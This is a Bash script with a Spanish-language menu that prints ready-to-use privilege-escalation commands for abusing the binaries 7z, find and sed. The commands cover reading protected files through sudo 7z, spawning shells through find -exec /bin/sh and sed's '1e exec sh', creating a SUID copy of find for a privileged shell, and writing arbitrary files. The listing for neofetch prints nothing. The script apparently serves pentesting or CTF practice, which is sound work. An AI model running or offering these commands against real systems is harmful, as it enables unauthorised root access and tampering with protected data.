#!/bin/bash

#---------------------------------------------
# Colores
#---------------------------------------------
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
MAGENTA='\e[1;35m'
CYAN='\e[1;36m'
RESET='\e[0m'

#---------------------------------------------
# Salida del script
#---------------------------------------------
cleanup() {
        printf "\n${RED}[+] Abandonando el script ...${RESET}\n"
        exit 1
}

trap cleanup SIGINT

while true; do
	clear


#---------------------------------------------
# Banner
#---------------------------------------------
printf "${BLUE} \\_ |__ |__| ____   ______ ________________    ____ |  | __
 | __ \\\\|  |/    \\\\ /  ___// ___\\\\_  __ \\\\__  \\\\ _/ ___\\\\|  |/ /
 | \\\\_\\\\ \\\\  |   |  \\\\\\\\___ \\\\\\\\  \\\\___|  | \\\\\\\\// __ \\\\\\\\  \\\\___>
 |___  /__|___|  /____  >\\\\\\\\___  >__|  (____  /\\\\\\\\___  >__|_ \\\\
${RESET}"

printf "${MAGENTA}Author @wvverez${RESET}\n\n"

#---------------------------------------------
# Menú
#---------------------------------------------
printf "${YELLOW}\uf071 Elige binario a abusar${RESET}\n\n"

printf "${CYAN}1)${RESET} ${GREEN}7z${RESET}\n\n"
printf "${CYAN}2)${RESET} ${GREEN}find${RESET}\n\n"
printf "${CYAN}3)${RESET} ${GREEN}sed${RESET}\n\n"
printf "${CYAN}4)${RESET} ${GREEN}neofetch${RESET}\n\n"

read -p "Selecciona binario: " opcion

#---------------------------------------------
# Opciones del menú
#---------------------------------------------
case $opcion in

1)
    printf "${GREEN}[+] Binario seleccionado... :${RESET} ${CYAN}7z${RESET}\n\n"
    printf "${YELLOW}Como abusar de el:${RESET}\n"

    printf "${RED}[+] SUDO${RESET}=\n"
    echo ""
    printf "LFILE=file_to_read\n"
	echo ""
    printf "sudo 7z a -ttar -an -so \$LFILE | 7z e -ttar -si -so\n"
    echo ""
    printf "${RED}[+] FILEREAD${RESET}=\n"
    echo ""
    printf "LFILE=file_to_read\n"
    echo ""
    printf "7z a -ttar -an -so \$LFILE | 7z e -ttar -si -so\n"
    ;;


2)
    printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}find${RESET}\n\n"
printf "${YELLOW}Como abusar de el:${RESET}\n\n"

printf "${RED}[+] SUDO ${RESET}=\n"
printf "sudo find . -exec /bin/sh \\; -quit\n\n"

printf "${RED}[+] SHELL ${RESET}=\n"
printf "find . -exec /bin/sh \\; -quit\n\n"

printf "${RED}[+] SUID ${RESET}=\n"
printf "sudo install -m =xs \$(which find) .\n"
printf "./find . -exec /bin/sh -p \\; -quit\n\n"

printf "${RED}[+] FILEWRITE ${RESET}= LFILE=file_to_write; find / -fprintf \"\$LFILE\" DATA -quit\n"
;;

3)
    printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}sed${RESET}\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n"

	printf "${RED}[+] SUDO ${RESET}= sudo sed -n '1e exec sh 1>&0' /etc/hosts \n"
	echo ""
	printf "${RED}[+] SHELL ${RESET}= sed -n '1e exec sh 1>&0' /etc/hosts OR sed e \n"
    ;;

4)
    printf "${GREEN}Elegiste:${RESET} ${CYAN}neofetch${RESET}\n"
    ;;

*)
    printf "${RED}Binario no encontrado...${RESET}\n"
    ;;
esac

echo ""


read -p "¿Quieres elegir otro binario? (Y/N): " again
    case "$again" in
        Y|y) continue ;;
        N|n) cleanup ;;
        *) 
            printf "${RED}Respuesta no válida. Saliendo...${RESET}\n"
            cleanup
        ;;
    esac

done
